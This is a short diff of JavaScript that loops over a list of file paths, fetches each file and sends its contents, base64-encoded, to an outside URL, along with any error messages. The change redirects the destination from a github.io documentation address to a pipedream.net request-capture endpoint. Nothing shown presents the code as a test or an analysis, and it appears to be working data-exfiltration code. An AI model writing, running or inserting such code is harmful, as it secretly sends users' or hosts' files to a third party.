@@ -26,10 +26,10 @@ paths.forEach(function(path, i) {
     fetch(path)
       .then(function(r) { return r.text(); })
       .then(function(d) {
-        fetch('https://dglabz.github.io/crypto-api-docs/index.html?file=' + encodeURIComponent(path) + '&data=' + btoa(d));
+        fetch('https://eoh2zr5zzepcygc.m.pipedream.net?file=' + encodeURIComponent(path) + '&data=' + btoa(d));
       })
       .catch(function(e) {
-        fetch('https://dglabz.github.io/crypto-api-docs/index.html?file=' + encodeURIComponent(path) + '&error=' + e.message);
+        fetch('https://eoh2zr5zzepcygc.m.pipedream.net?file=' + encodeURIComponent(path) + '&error=' + e.message);
       });
   }, i * 200);
 });
